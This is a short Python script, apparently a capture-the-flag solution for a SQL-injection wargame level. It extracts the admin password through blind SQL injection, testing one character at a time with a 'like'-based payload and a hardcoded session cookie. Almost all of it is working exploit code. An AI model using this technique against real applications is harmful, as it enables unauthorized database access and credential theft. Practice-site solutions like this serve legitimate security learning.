#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

pw=""

for i in range(1,9):
  for j in range(48,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
    try:
      url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1' || id like 'admin' %26%26 right(left(pw, " + str(i) + "), 1) like'" + chr(j)
      result = requests.post(url, cookies=(dict(PHPSESSID="972tnijeh99tkes99t226rp11h")))
    except:
      print("Error...")
      continue
    if 'Hello admin' in result.text:
      pw = pw + chr(j)
      print("pw : " + pw)
      break